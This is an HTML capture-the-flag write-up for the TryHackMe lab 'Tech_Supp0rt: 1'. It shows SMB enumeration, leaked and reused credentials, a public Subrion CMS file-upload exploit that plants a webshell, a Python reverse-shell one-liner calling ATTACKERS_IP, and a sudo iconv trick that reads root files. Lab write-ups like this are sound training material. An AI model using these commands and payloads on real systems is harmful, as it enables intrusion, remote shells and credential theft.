@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+
+        <link rel="icon" type="image/jpg" href="../Images/Rouge_Death_dp.jpg">
+        <title>Tech_Supp0rt 1</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="../css/styles.css">
+
+    </head>
+
+    <body>
+
+        <div class="navbar">
+            <h1>Tech_Supp0rt: 1<span class="blink">|</span></h1>
+            <p>
+                <a class="other-links" href="../index.html">home</a> . 
+                <a class="other-links" href="../writeups.html">writeups</a> . 
+                <a href="techsupport1.html"><u>techsupport1</u></a> | 
+                <a class="other-links" href="https://tryhackme.com/room/techsupp0rt1">TryHackMe</a>
+            </p>
+            <button id="toggle" onclick="svg_changer()"></button>
+        </div>
+
+        <div id="table-of-contents">
+            <h3>Contents:</h3>
+            <a href="#enum">
+                <h4>
+                    Enumeration
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#nmap">
+                        Nmap
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#smbclient">
+                        SMBClient
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#subrion">
+                        Subrion
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+
+            <br />
+
+            <a href="#exploit">
+                <h4>
+                    Exploitation
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#searchsploit">
+                        SearchSploit
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+                <li>
+                    <a href="#shell-pop">
+                        Gaining Shell
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+            <br />
+            <a href="#priv-esc">
+                <h4>
+                    Privilege Escalation
+                    <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                    </svg>
+                </h4>
+            </a>
+            <ul class="no-list-style-toc">
+                <li>
+                    <a href="#sudo">
+                        sudo -l
+                        <svg id="toc-link-ico" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="phase">
+
+            <div class="phase-sec">
+                <h3 class="phase-title" id="enum">Enumeration:</h3>
+
+                <h4 id="nmap">Nmap</h4>
+<pre class="terminal-output">
+# Nmap 7.92 scan initiated Sun Apr 17 14:41:24 2022 as: nmap -v -T4 -A -oN nmap.results 10.10.141.251
+Nmap scan report for 10.10.141.251
+Host is up (0.28s latency).
+Not shown: 989 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE     VERSION
+22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
+|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
+|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
+80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1010/tcp  filtered surf
+3998/tcp  filtered dnx
+6565/tcp  filtered unknown
+8099/tcp  filtered unknown
+9503/tcp  filtered unknown
+32782/tcp filtered unknown
+62078/tcp filtered iphone-sync
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2022-04-17T09:12:04
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT\x00
+|   Domain name: \x00
+|   FQDN: techsupport
+|_  System time: 2022-04-17T14:42:02+05:30
+|_clock-skew: mean: -1h49m57s, deviation: 3h10m31s, median: 1s
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr 17 14:42:12 2022 -- 1 IP address (1 host up) scanned in 48.00 seconds
+</pre>
+                <p>Nmap found four ports open i.e port 22, port 80, port 139 & port 445.</p>
+                <p>Samba and http services are the interesting ones. Let&apos;s enumerate them more.</p>
+
+                <h4 id="smbclient">SMBClient</h4>
+<pre class="terminal-output">
+$ smbclient -L //10.10.141.251/   
+Can't load /etc/samba/smb.conf - run testparm to debug it
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        websvr          Disk      
+        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+</pre>
+                <p>There is a share called <em>&quot;websvr&quot;</em>. Let&apos;s see what&apos;s there in this share.</p>
+<pre class="terminal-output">
+$ smbclient //10.10.141.251/websvr
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat May 29 12:47:38 2021
+  ..                                  D        0  Sat May 29 12:33:47 2021
+  enter.txt                           N      273  Sat May 29 12:47:38 2021
+
+      8460484 blocks of size 1024. 5693632 blocks available
+</pre>
+                <p>There is file called <em>&quot;enter.txt&quot;</em>. Let&apos;s download and check the contents of this file.</p>
+<pre class="terminal-output">
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
+Wordpress creds
+|->
+</pre>
+                <p>This seems like an encoded string <em>&quot;7sKvntXdPEJaxazce9PXi24zaFrLiKWCk&quot;</em>, let's try to decode it in CyberChef.</p>
+                <div class="phase-img">
+                    <img src="../Images/wu/techsupport1/cyberchef_magic.png" alt="Image of the decoded string in CyberChef." />
+                </div>
+                <p>We'll get the credentials for Subrion CMS.<br /><em>&quot;admin:[redacted]&quot;</em></p>
+
+                <h4 id="subrion">Subrion</h4>
+                <p>Visiting <em>&quot;/subrion&quot;</em>, we'll get error. <em>&quot;enter.txt&quot;</em> says &quot;edit from panel&quot;. The robots.txt from sbrion github repo has a directory <em>&quot;/panel&quot;</em></p>
+                <p>So visiting <em>&quot;http://MACHINE-IP/subrion/panel&quot;</em> gives a login page.</p>
+                <div class="phase-img">
+                    <img src="../Images/wu/techsupport1/subrion_login.png" alt="Image of the login page for Subrion CMS." />
+                </div>
+
+            </div>
+
+        </div>
+
+        <div class="phase">
+            <div class="phase-sec">
+
+                <h3 class="phase-title" id="exploit">Exploitation:</h3>
+
+
+                <h4 id="searchsploit">SearchSploit</h4>
+                <p>Let's search for Subrion CMS in searchsploit. Let's use &quot;Subrion CMS 4.2.1 - Arbitrary File Upload&quot; exploit.</p>
+                <blockquote class="payload">searchsploit -m php/webapps/49876.py</blockquote>
+<pre class="terminal-output">
+$ python3 exploit.py -u http://10.10.12.28/subrion/panel/ -l admin -p Scam2021
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://10.10.12.28/subrion/panel/
+[+] Success!
+[+] Got CSRF token: hF8OC3YxZphohKpWVDeEoq4f9M9lMMMlp9Aiv4CX
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: nsxkhishwdgtbwu
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://10.10.12.28/subrion/panel/uploads/nsxkhishwdgtbwu.phar 
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+                <p>We get command execution. Let's setup a netcat listener and pop a shell.</p>
+
+                <h4 id="shell-pop">Gaining Shell</h4>
+<pre class="terminal-output">
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKERS_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre>
+                <p>Let's upgrade the shell to more interactive one.</p>
+<pre class="terminal-output">
+$ nc -lvnp 1234
+Connection from 10.10.12.28:39574
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@TechSupport:/var/www/html/subrion/uploads$ ^Z
+[1]  + 6844 suspended  nc -lvnp 1234
+$ stty raw -echo; fg
+[1]  + 6844 continued  nc -lvnp 1234
+                                    export TERM=xterm
+www-data@TechSupport:/var/www/html/subrion/uploads$
+</pre>
+                <p>Let's check the file <em>&quot;wp-config.php&quot;</em> in the wordpress directory.</p>
+<pre class="terminal-output">
+--snip--
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wpdb' );
+
+/** MySQL database username */
+define( 'DB_USER', 'support' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '[Redacted]23!' );
+--snip--
+</pre>
+                <p>Let's check if we can login through SSH as user <em>&quot;scamsite&quot;</em> with the above password we got.</p>
+<pre class="terminal-output">
+$ ssh scamsite@10.10.12.28
+The authenticity of host '10.10.12.28 (10.10.12.28)' can't be established.
+ECDSA key fingerprint is SHA256:7uTs3v+kKdbrstZX1KxU6ikR68w9y/eJ7gfEURJP2YI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.12.28' (ECDSA) to the list of known hosts.
+scamsite@10.10.12.28's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+120 packages can be updated.
+88 updates are security updates.
+
+
+Last login: Fri May 28 23:30:20 2021
+scamsite@TechSupport:~$
+</pre>
+                <p>Success, we can login as the user <em>&quot;scamsite&quot;</em>.</p>
+
+            </div>
+        </div>
+
+        <div class="phase">
+            <div class="phase-sec">
+
+                <h3 class="phase-title" id="priv-esc">Privilege Escalation:</h3>
+
+
+                <h4 id="sudo">sudo -l</h4>
+                <p>Let's list the allowed commands using sudo.</p>
+<pre class="terminal-output">
+scamsite@TechSupport:~$ sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv    
+</pre>
+                <p>Let's see if we can find any priv-esc techniques in GTFOBins.</p>
+                <div class="phase-img">
+                    <img src="../Images/wu/techsupport1/gtfobins_iconv.png" alt="Image of GTFOBins SUDO for iconv." />
+                </div>
+<pre class="terminal-output">
+scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
+851b8233[Redacted]
+</pre>
+                <p>We get the root flag.</p>
+
+            </div>
+        </div>
+
+        <script src="../js/themes.js"></script>
+        
+    </body>
+
+</html>
